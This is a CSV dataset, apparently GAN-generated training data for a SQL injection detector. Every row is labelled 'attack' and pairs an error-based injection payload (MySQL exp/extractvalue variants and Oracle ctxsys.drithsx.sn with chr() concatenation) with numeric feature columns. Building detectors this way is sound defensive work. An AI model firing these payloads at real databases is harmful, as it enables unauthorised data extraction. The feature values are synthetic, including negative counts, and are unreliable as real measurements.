id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000037,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,4.859943939200047,281.1776123046875,71.84972381591797,42.53158950805664,109.56602478027344,-0.9450539946556091,79.87240600585938,48.61031723022461,1.2654836177825928,0.2565302848815918,0.16652698814868927,0.40641066431999207,0.13680408895015717,3.627831220626831,1.320981502532959,1.3034776449203491,0.8608619570732117,0.17942014336585999,0.03725589066743851,0.08329105377197266,10.527636528015137,10.804521560668945,2.517482280731201,0.015101797878742218,1.909569263458252,0.1429876834154129,-0.0745791643857956,0.09571819752454758,0.02742328681051731,0.606752336025238,-0.04472199082374573,-0.013258054852485657,1.573241114616394,0.31839853525161743,0.3911053538322449,2.108229398727417,8.374457359313965,0.8008226156234741,1.918725609779358,0.26482564210891724,0.31948143243789673,0.926162600517273,-0.08882700651884079,0.020875906571745872,0.048635467886924744,-0.04399406909942627,-0.23080205917358398,0.4798092842102051,0.42010289430618286,0.474130243062973,0.1491132527589798,0.45013943314552307,-0.15395720303058624,0.0567147359251976,0.17328158020973206,0.021438995376229286,0.042974911630153656,0.14518922567367554,0.03388494253158569,-0.02074657380580902,-0.14117470383644104,0.12874406576156616,-0.037026844918727875,0.10378440469503403,0.22023825347423553,-0.0856277197599411,0.6091145873069763,0.07528769224882126,0.09630687534809113,-0.02737075835466385,0.017961759120225906,-0.15318018198013306,0.04948700964450836,0.27989065647125244,0.012584003619849682,0.1546643227338791,1.2715413570404053,0.2960772216320038,-0.18084418773651123,0.022851577028632164,0.16580301523208618,8.224799156188965,0.8325685262680054,0.1663658171892166,-0.03896969184279442,0.5959246754646301,0.008574958890676498,0.15014754235744476,-0.24140435457229614
GAN_000038,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.2914586897591365,282.3235168457031,63.10315704345703,39.47382736206055,98.55220794677734,1.0371257066726685,89.54256439208984,51.9984016418457,0.9041191339492798,0.25479617714881897,0.1744948923587799,0.40727904438972473,0.134675994515419,3.644885301589966,0.5740432143211365,1.2951018810272217,0.6228122711181641,0.20029038190841675,0.03596186637878418,0.03691478073596954,11.827425003051758,10.286218643188477,1.7795180082321167,0.011678732931613922,1.9812036752700806,0.23770888149738312,-0.04051674157381058,0.047075506299734116,0.1009487733244896,0.6407222151756287,0.015366774052381516,-0.2770271599292755,1.6287779808044434,-0.024679090827703476,0.2783688008785248,2.4329192638397217,9.345931053161621,0.9415538907051086,2.1186347007751465,0.19381071627140045,0.4322323799133301,0.9882630109786987,0.07439636439085007,0.0516897588968277,0.470726877450943,-0.311020165681839,0.030040547251701355,0.5350024700164795,0.5181165933609009,0.6684889793395996,0.25656551122665405,0.25476375222206116,-0.04207388311624527,0.19108670949935913,0.19094763696193695,0.01024982612580061,0.0037612731102854013,0.10740604996681213,-0.1765749752521515,0.27000942826271057,0.03865540027618408,-0.046624019742012024,-0.15955263376235962,0.0897228792309761,0.32403066754341125,0.026242565363645554,0.49854403734207153,0.36514514684677124,0.030819734558463097,-0.09952443093061447,-0.0558440163731575,-0.13227106630802155,0.15091417729854584,-0.046547919511795044,0.02094830945134163,0.0010882355272769928,1.294376254081726,0.2869998812675476,-0.17945921421051025,0.13903658092021942,0.2713034152984619,8.415343284606934,0.9013048410415649,0.20168207585811615,0.011564652435481548,0.6385633945465088,0.08142543584108353,-0.07616561651229858,0.026247262954711914
GAN_000039,attack,error,"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",nearest_attack_euclidean,R000239,4.947634158353368,288.8197937011719,73.42918395996094,41.99024963378906,116.75829315185547,1.267276406288147,81.47271728515625,44.436100006103516,1.0119760036468506,0.2735694646835327,0.15952026844024658,0.404827743768692,0.1346612125635147,3.6838910579681396,1.0875818729400635,1.2990421056747437,0.7131903171539307,0.09779935330152512,0.07338912785053253,0.03107237070798874,10.95661449432373,11.31499195098877,3.0850791931152344,0.08022177964448929,1.9721533060073853,0.1448773294687271,-0.006729902699589729,0.06335774809122086,0.05366947129368782,0.643502950668335,-0.0337507426738739,-0.10766224563121796,1.5682657957077026,0.048057734966278076,0.3597041964530945,2.145443916320801,9.139695167541504,0.9391945600509644,2.005577802658081,0.19448696076869965,0.36532706022262573,0.946053147315979,-0.13241714239120483,0.04469460994005203,0.01891251653432846,-0.054319486021995544,-0.19752833247184753,0.47039830684661865,0.5339307188987732,0.5616381168365479,0.2495710402727127,0.35291048884391785,-0.0956123024225235,0.06552929431200027,0.2026418149471283,0.009278743527829647,0.03777265176177025,-0.011817127466201782,0.17283648252487183,0.1759582757949829,-0.048071518540382385,0.09852895885705948,0.024467304348945618,-0.1584579050540924,0.15622426569461823,-0.08133702725172043,0.47705134749412537,0.1416395902633667,0.12380319833755493,0.05814217031002045,-0.12903791666030884,0.015071656554937363,0.1188717782497406,0.08256219327449799,0.015413414686918259,-0.10790357738733292,1.2434509992599487,0.4137975573539734,-0.017341524362564087,0.025130843743681908,0.1764209270477295,8.29365062713623,0.8389191031455994,0.16815964877605438,0.021941212937235832,0.5489037036895752,0.026043545454740524,0.16433307528495789,0.026602551341056824
GAN_000040,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,4.977993565644465,285.2884216308594,73.12518310546875,41.29423522949219,100.64274597167969,-0.01240463089197874,80.2564468383789,47.73338317871094,1.0620073080062866,0.2479902058839798,0.16418829560279846,0.40590131282806396,0.1353403925895691,3.6506574153900146,1.1471701860427856,1.2144100666046143,0.8000913262367249,0.12976126372814178,0.0516776405274868,0.00986478105187416,11.022595405578613,10.438257217407227,2.4785690307617188,-0.040682353079319,1.8855704069137573,0.1723479926586151,-0.017511527985334396,0.10624111443758011,0.08840268105268478,0.6515765190124512,-0.0011734142899513245,-0.17300161719322205,1.4910470247268677,0.29382532835006714,0.32513490319252014,2.179198980331421,8.771894454956055,0.8284827470779419,1.7662417888641357,0.10934124886989594,0.3833710849285126,0.9375912547111511,0.029496703296899796,0.020048918202519417,0.11972957849502563,-0.17931422591209412,-0.11622893065214157,0.5222781896591187,0.4779462516307831,0.5698118209838867,0.2715650200843811,0.4335671663284302,-0.09436212480068207,0.09628253430128098,0.1694801151752472,0.03244098275899887,0.03314858302474022,0.19455771148204803,-0.057666730135679245,0.17434056103229523,-0.12788395583629608,0.22137710452079773,-0.06872036308050156,0.11555234342813492,0.21898633241653442,0.030751246958971024,0.5097041130065918,0.09366705268621445,0.15835870802402496,-0.034874327480793,-0.09608253836631775,-0.20284560322761536,0.10699141025543213,0.11399371922016144,0.015609079040586948,0.07554136216640472,1.2189141511917114,0.26852282881736755,-0.20582810044288635,0.031072957441210747,0.21862159669399261,7.99545431137085,0.9176320433616638,0.22362078726291656,-0.018606726080179214,0.6539143323898315,0.09051388502120972,0.03863153234124184,-0.024692796170711517
GAN_000041,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,5.036173487774449,284.7170715332031,67.81461334228516,40.57206344604492,103.52983856201172,2.779921054840088,83.85501098632812,46.60783386230469,0.912903368473053,0.2638676166534424,0.1664390116930008,0.4031241834163666,0.13426128029823303,3.644181966781616,0.6511131525039673,1.1316421031951904,0.5323983430862427,0.12458090484142303,0.023172147572040558,-0.09983845055103302,10.844770431518555,10.656357765197754,2.0162558555603027,0.10453927516937256,2.0462119579315186,0.1994602382183075,-0.04409429803490639,0.13466240465641022,0.011040433309972286,0.6163418292999268,-0.09836000949144363,-0.12366513907909393,1.510986328125,-0.06948097050189972,0.2909461557865143,2.3710546493530273,9.770357131958008,1.0351730585098267,1.943451166152954,0.15925776958465576,0.37308576703071594,1.048703670501709,-0.022283226251602173,0.020773550495505333,0.3336361050605774,-0.2552831470966339,-0.12023431807756424,0.44735342264175415,0.457447350025177,0.5448302626609802,0.23233267664909363,0.3384639620780945,-0.21156206727027893,0.3285135328769684,0.28104642033576965,-0.002939486177638173,0.0016224870923906565,-0.019611580297350883,0.07793009281158447,0.3145259916782379,-0.03586919605731964,-0.07115814834833145,-0.17928841710090637,0.12089838832616806,0.2442338913679123,0.07475495338439941,0.512710452079773,0.2071819007396698,0.07373837381601334,-0.017191410064697266,0.00546637549996376,-0.07065175473690033,0.11183229088783264,0.020113803446292877,0.014525012113153934,0.006512731313705444,1.247854471206665,0.385135680437088,-0.24087095260620117,0.08824890106916428,0.30172523856163025,8.683762550354004,0.8678479194641113,0.21398982405662537,0.05151413008570671,0.5131719708442688,-0.05817212164402008,-0.03516747057437897,0.09784562885761261
GAN_000042,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,4.915314563910391,280.94635009765625,72.85955810546875,41.13323974609375,101.59486389160156,1.8339781761169434,78.54838562011719,44.06702423095703,1.1001317501068115,0.27182117104530334,0.16661971807479858,0.4034258723258972,0.13597121834754944,3.6686174869537354,0.9594363570213318,0.946338415145874,0.6445052027702332,0.11244557797908783,0.03924427181482315,-0.018606510013341904,10.346766471862793,10.31613540649414,2.3696508407592773,0.05168275162577629,2.0121493339538574,0.15254299342632294,-0.008457857184112072,0.2707989811897278,0.06570878624916077,0.5473900437355042,0.0735129714012146,-0.12252120673656464,1.510977029800415,0.1310434192419052,0.3089649975299835,2.2360944747924805,8.794913291931152,0.9605645537376404,1.8709330558776855,0.24371238052845,0.310503214597702,0.9218782782554626,0.12660014629364014,0.038511112332344055,0.06987962126731873,-0.07424913346767426,-0.15519627928733826,0.48668432235717773,0.4088125228881836,0.4595220685005188,0.3423422574996948,0.410540908575058,-0.19445765018463135,0.11403333395719528,0.246810182929039,0.03949747979640961,0.03301779553294182,0.0469476655125618,-0.0759439468383789,0.2164374589920044,-0.0866575762629509,0.021676085889339447,0.007895104587078094,0.09247689694166183,0.2350381314754486,0.020024660974740982,0.5642903447151184,0.06006244570016861,0.017303237691521645,-0.11280878633260727,0.11216683685779572,-0.15753579139709473,0.053756579756736755,0.047999024391174316,0.007856938987970352,0.12645050883293152,1.1023539304733276,0.3704146146774292,-0.1325157880783081,0.07532872259616852,0.22505435347557068,8.394895553588867,0.7642209529876709,0.19219017028808594,0.03592027723789215,0.5934470295906067,-0.08672349154949188,-0.09398595243692398,-0.11407064646482468
GAN_000043,attack,error,"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",nearest_attack_euclidean,R000239,4.918952862968388,291.5068054199219,75.02438354492188,39.183414459228516,109.33647155761719,1.2370643615722656,82.1413803100586,48.28484344482422,1.2297388315200806,0.25354287028312683,0.16584329307079315,0.41028350591659546,0.13264724612236023,3.5993056297302246,0.7627833485603333,1.608724594116211,0.747014045715332,0.1445169746875763,0.03934020176529884,-0.10564656555652618,10.9070405960083,10.587397575378418,2.2166337966918945,0.012795120477676392,1.993107557296753,0.17417244613170624,-0.04748620092868805,-0.07899332791566849,0.017330802977085114,0.5505158305168152,-0.03783494234085083,0.12927944958209991,1.604858160018921,0.13907796144485474,0.42807233333587646,2.0917787551879883,8.698984146118164,0.9319807291030884,2.037064552307129,0.2756813168525696,0.3241824805736542,0.9746798276901245,-0.2638089954853058,0.0436207577586174,0.10117793083190918,-0.35609346628189087,-0.15499363839626312,0.4256160855293274,0.45016440749168396,0.582587718963623,0.10657189786434174,0.30432015657424927,-0.1761920154094696,0.2701285481452942,0.2123229205608368,-0.010895674116909504,0.03995739668607712,-0.05542260780930519,0.2845424711704254,0.17987759411334991,-0.04775399714708328,0.1149422898888588,-0.026182495057582855,-0.10611211508512497,0.2954094111919403,-0.045784205198287964,0.643312394618988,0.25980544090270996,0.06671318411827087,-0.0271979421377182,-0.050917915999889374,-0.2089720219373703,0.042827531695365906,0.15302051603794098,0.025083277374505997,0.00923570990562439,1.333378791809082,0.417829692363739,-0.23434585332870483,-0.04787217825651169,0.2341333031654358,7.739357948303223,0.9102911353111267,0.19726574420928955,0.007280170451849699,0.5907111763954163,0.07425624877214432,-0.020295031368732452,-0.058951377868652344
GAN_000044,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,5.105576684788648,290.5882568359375,70.52623748779297,40.645931243896484,106.984375,-1.9666881561279297,83.16654205322266,53.79499816894531,1.3037071228027344,0.23972120881080627,0.16653665900230408,0.40815794467926025,0.13557617366313934,3.622765302658081,1.2818049192428589,1.6817209720611572,0.8885498642921448,0.1804216504096985,0.037376534193754196,0.078433558344841,11.242222785949707,10.045868873596191,2.1757848262786865,-0.10524993389844894,1.9328566789627075,0.14872626960277557,-0.09710671752691269,-0.11508915573358536,0.027946583926677704,0.6673164367675781,-0.0725376084446907,0.03245657682418823,1.5521926879882812,0.3815370798110962,0.40042844414711,2.078921318054199,8.081857681274414,0.703632652759552,1.9604960680007935,0.2880757749080658,0.32974421977996826,0.969809889793396,-0.1414843499660492,0.041914768517017365,0.0860815942287445,-0.1777646243572235,-0.2123653143644333,0.5205299258232117,0.39609837532043457,0.5266003012657166,0.07326944172382355,0.46370235085487366,-0.2389821708202362,0.03520740568637848,0.13426361978054047,0.005699279718101025,0.007139016408473253,0.08231845498085022,0.1657513678073883,-0.0277550145983696,-0.20729359984397888,0.3096816837787628,-0.0846753939986229,0.09062019735574722,0.23770970106124878,-0.17878133058547974,0.6023772954940796,0.20858335494995117,0.18537744879722595,-0.007979542016983032,-0.02468268573284149,-0.10623180121183395,0.19763833284378052,0.43271172046661377,0.025182059034705162,0.14815926551818848,1.2982401847839355,0.224064439535141,-0.29520753026008606,-0.031107941642403603,0.18647505342960358,7.845019340515137,0.9431468844413757,0.20609433948993683,-0.07781034708023071,0.6308248043060303,0.1650294065475464,0.2374238520860672,-0.19294306635856628
GAN_000045,attack,error,"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat",nearest_attack_euclidean,R000301,4.9233763901687615,289.5871276855469,71.02323913574219,42.94383239746094,116.7643051147461,1.1522293090820312,81.51716613769531,46.27141189575195,1.0374090671539307,0.2701793313026428,0.16272437572479248,0.4040650725364685,0.13804423809051514,3.630075216293335,1.1716387271881104,1.2540183067321777,0.817003071308136,0.1357627958059311,0.05262210592627525,0.06258037686347961,10.670063018798828,11.092955589294434,3.001554012298584,0.0762372612953186,1.978064775466919,0.16558119654655457,-0.05581143870949745,0.15639379620552063,0.0421147346496582,0.6890473961830139,-0.1320541501045227,-0.12511032819747925,1.6368309259414673,0.11276988685131073,0.3422134816646576,2.3163774013519287,9.387539863586426,0.9211931824684143,1.9758306741714478,0.10652823746204376,0.36558082699775696,0.9360699653625488,-0.04652049392461777,0.026470892131328583,0.18012917041778564,0.011913716793060303,-0.18374088406562805,0.4536297917366028,0.505634605884552,0.5362796187400818,0.20945234596729279,0.38713085651397705,-0.07026712596416473,0.11819005757570267,0.2022016942501068,0.012026707641780376,0.05088745802640915,0.09312166273593903,0.024020463228225708,0.11730767786502838,0.04302297532558441,0.04084256291389465,-0.08052311092615128,-0.006388764828443527,0.18505844473838806,-0.011456958949565887,0.5473614931106567,0.10621639341115952,0.1178116574883461,0.10136619210243225,-0.14633457362651825,-0.10552719235420227,-0.011664018034934998,0.08405481278896332,0.015881333500146866,0.022468876093626022,1.315078616142273,0.38137680292129517,-0.07049570977687836,0.036638371646404266,0.18401138484477997,8.653449058532715,0.8242084980010986,0.1855490505695343,-0.0006623349036090076,0.5386481881141663,-0.11919102072715759,0.17981301248073578,-0.06519676744937897
GAN_000046,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,5.346321091508553,282.9659729003906,65.74551391601562,43.140995025634766,94.5130844116211,-0.13954873383045197,89.13885498046875,56.21272659301758,1.2094509601593018,0.22014020383358002,0.17248962819576263,0.41108664870262146,0.13217517733573914,3.5554604530334473,0.8267698884010315,1.6055920124053955,0.862066924571991,0.23034143447875977,0.01809246651828289,-0.09634482860565186,11.334300994873047,10.809483528137207,1.7029238939285278,-0.023732423782348633,1.8972563743591309,0.2185509204864502,-0.08943577855825424,0.03834694251418114,0.021006973460316658,0.6301843523979187,-0.09957004338502884,0.045132994651794434,1.4681220054626465,0.337204247713089,0.39461493492126465,2.499011754989624,9.107184410095215,0.6799474954605103,1.7881062030792236,0.03916158154606819,0.4902517795562744,1.0981706380844116,-0.13568410277366638,-0.03562797233462334,0.4961257874965668,-0.17782044410705566,-0.12894177436828613,0.4676837623119354,0.5137869715690613,0.6360611915588379,-0.015888946130871773,0.363292932510376,-0.20937129855155945,0.37963759899139404,0.21664121747016907,0.006158656440675259,0.037490591406822205,0.5027647018432617,0.031022310256958008,0.09316089004278183,0.10246790945529938,0.2082790732383728,-0.3015405833721161,0.2223799228668213,0.34061163663864136,0.014480438083410263,0.6702201962471008,0.0828719362616539,0.11142076551914215,-0.1845526099205017,-0.11494411528110504,-0.3301803767681122,-0.0025673508644104004,0.26371142268180847,0.018274085596203804,0.17424573004245758,1.5639983415603638,0.2331278771162033,-0.36874330043792725,-0.007054531015455723,0.18673188984394073,8.200124740600586,0.9373602271080017,0.2708764374256134,-0.04473361000418663,0.5478583574295044,-0.01649544946849346,0.02166234701871872,-0.1619492769241333
GAN_000047,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R000048,4.931178693255754,292.8655090332031,72.18760681152344,41.87134552001953,112.07219696044922,-0.9050747752189636,82.48572540283203,48.63251876831055,0.9933207631111145,0.2557666599750519,0.16173096001148224,0.4068657159805298,0.13712547719478607,3.66983962059021,1.3486738204956055,1.584180474281311,0.7836118340492249,0.11735502630472183,0.059136763215065,0.2173885852098465,10.723185539245605,11.018657684326172,2.9840128421783447,-0.07456033676862717,1.9227491617202759,0.16542130708694458,-0.06431308388710022,0.04007976874709129,0.07600206136703491,0.6971725821495056,-0.14477619528770447,-0.24771669507026672,1.7002980709075928,0.2983050048351288,0.3366333842277527,2.118901491165161,8.24309253692627,0.9416257739067078,1.960587501525879,0.1197236180305481,0.37584492564201355,0.9750900864601135,-0.06448739022016525,0.048521652817726135,0.1365889608860016,-0.12912674248218536,-0.14899131655693054,0.6216973066329956,0.5191627144813538,0.5719400644302368,0.306733638048172,0.43439769744873047,-0.2359275221824646,-0.012554127722978592,0.17095206677913666,0.04277960956096649,0.025997120887041092,0.09868888556957245,-0.008962094783782959,0.160561665892601,-0.09756334125995636,0.22972708940505981,-0.16157463192939758,0.02072756737470627,0.1902453899383545,-0.12869325280189514,0.439510315656662,0.1897384524345398,0.248971089720726,0.07993896305561066,-0.12789380550384521,-0.24398453533649445,0.1433555781841278,0.1028740257024765,0.019667353481054306,-0.01518598198890686,1.2531766891479492,0.2618130147457123,-0.19163170456886292,-0.006486141122877598,0.16100606322288513,7.799022674560547,0.9353392720222473,0.21722935140132904,-0.04823652282357216,0.5949949026107788,0.07451391220092773,0.10820825397968292,0.04159063100814819
GAN_000048,attack,error,"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat",nearest_attack_euclidean,R000301,4.864477567496842,277.2397155761719,74.8113784790039,40.236568450927734,110.53096008300781,0.04892735555768013,77.29000854492188,45.049434661865234,0.9069143533706665,0.2891683578491211,0.16913875937461853,0.40543580055236816,0.13542968034744263,3.674344539642334,1.108068585395813,1.1030327081680298,0.6067979335784912,0.14356938004493713,0.05143057554960251,0.33137136697769165,10.34606647491455,10.131281852722168,3.1613643169403076,0.05753660574555397,1.9281260967254639,0.16064453125,-0.09696539491415024,0.13055387139320374,0.053406696766614914,0.5697535276412964,-0.08038032799959183,-0.24787764251232147,1.7143521308898926,0.024145368486642838,0.31306448578834534,2.1488146781921387,8.93917179107666,1.1655375957489014,2.1132893562316895,0.28008487820625305,0.2692278325557709,0.837276041507721,0.012578584253787994,0.0793425664305687,0.10086464881896973,-0.2284879982471466,0.003118261694908142,0.525211751461029,0.45492544770240784,0.5409210920333862,0.3237711787223816,0.30912718176841736,-0.05006098747253418,-0.0018016770482063293,0.17960761487483978,0.009903657250106335,0.04289975017309189,-0.0680759996175766,0.02874964475631714,0.2576257586479187,-0.15594469010829926,-0.22006919980049133,-0.0715487077832222,0.19531989097595215,0.17900089919567108,-0.027753598988056183,0.46808376908302307,0.21236231923103333,0.1539401262998581,0.12648983299732208,0.07385271787643433,-0.10381763428449631,0.08472781628370285,0.10100090503692627,0.018282275646924973,-0.1118754968047142,1.2613462209701538,0.43701696395874023,-0.13586033880710602,0.10241495817899704,0.26924997568130493,8.071127891540527,0.8021027445793152,0.17180928587913513,0.03888695687055588,0.643462061882019,0.01135183870792389,-0.1115560531616211,-0.07653839141130447
GAN_000049,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.141846658238288,291.1784362792969,65.64220428466797,42.49103927612305,103.79196166992188,1.0358061790466309,84.10066986083984,48.247474670410156,0.8555105924606323,0.26442059874534607,0.168723464012146,0.4051234722137451,0.13732679188251495,3.6252548694610596,0.9734634757041931,1.1204431056976318,0.8658122420310974,0.19415433704853058,0.04306181147694588,0.035877667367458344,11.352612495422363,10.27747631072998,2.300722360610962,0.11105506867170334,1.9761518239974976,0.2483782172203064,-0.045080557465553284,0.1624922752380371,0.15826286375522614,0.6758429408073425,-0.057377301156520844,-0.34506845474243164,1.7556403875350952,0.08064420521259308,0.22604383528232574,2.4421420097351074,9.054428100585938,1.0430101156234741,2.0151314735412598,0.07604235410690308,0.4200107455253601,0.8549257516860962,0.24346277117729187,0.05496496707201004,0.3693069815635681,-0.17551618814468384,0.028962910175323486,0.5334654450416565,0.4456731677055359,0.6254322528839111,0.36040568351745605,0.42457082867622375,-0.032603345811367035,0.09140662103891373,0.1770118772983551,0.05577666684985161,0.05101647973060608,0.21977415680885315,-0.20775330066680908,0.12632855772972107,0.007207825779914856,-0.011602096259593964,-0.10434787720441818,0.2058320939540863,0.24698790907859802,0.05601158365607262,0.49455851316452026,0.19027161598205566,0.0565737709403038,0.09267918765544891,-0.1073724776506424,-0.21775302290916443,0.003731869161128998,-0.05764999985694885,0.016958855092525482,0.16495376825332642,1.2083358764648438,0.2982754409313202,-0.07479524612426758,0.11531198024749756,0.226430743932724,8.661704063415527,0.8244324326515198,0.20662422478199005,0.0059149074368178844,0.6229472160339355,-0.09902333468198776,-0.09582521766424179,0.10740223526954651
GAN_000050,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R000048,4.882280603786872,287.66796875,72.51165008544922,41.45146560668945,105.8721923828125,2.172027826309204,77.2350082397461,43.394996643066406,1.1777987480163574,0.2742263376712799,0.16167746484279633,0.4119676947593689,0.13454681634902954,3.65093994140625,0.8731619715690613,1.3289016485214233,0.8410249948501587,0.14888468384742737,0.07192296534776688,0.0155367162078619,10.60693359375,10.41899299621582,2.420156717300415,0.06949442625045776,2.003711700439453,0.1797202080488205,0.06067303568124771,0.21071363985538483,0.14769048988819122,0.5621441602706909,0.11974842846393585,-0.06962502747774124,1.6078822612762451,0.09517350792884827,0.2892175614833832,2.1938095092773438,8.709725379943848,0.9941215515136719,1.948130488395691,0.1619635820388794,0.31255975365638733,0.8318734765052795,0.05970708280801773,0.07221128791570663,-0.021523669362068176,-0.24655330181121826,-0.19211289286613464,0.5504419803619385,0.467529296875,0.47652706503868103,0.37644845247268677,0.3716265559196472,-0.22610080242156982,0.18691077828407288,0.1856061965227127,0.045397382229566574,0.05050446465611458,0.14172020554542542,-0.1651713252067566,-0.04295457899570465,0.019572973251342773,0.07995199412107468,-0.12136621028184891,0.00683964416384697,0.2646618187427521,-0.07233750820159912,0.576671838760376,0.1182759627699852,0.11717187613248825,0.02826397866010666,0.04927562549710274,-0.24481140077114105,-0.06710222363471985,0.06476067751646042,0.020248042419552803,0.13821396231651306,1.1206114292144775,0.3026483654975891,-0.0002636536955833435,0.07030312716960907,0.19206160306930542,8.028186798095703,0.7301781177520752,0.15304113924503326,0.004677682649344206,0.650093138217926,0.0008336007595062256,-0.13891097903251648,-0.2007165402173996
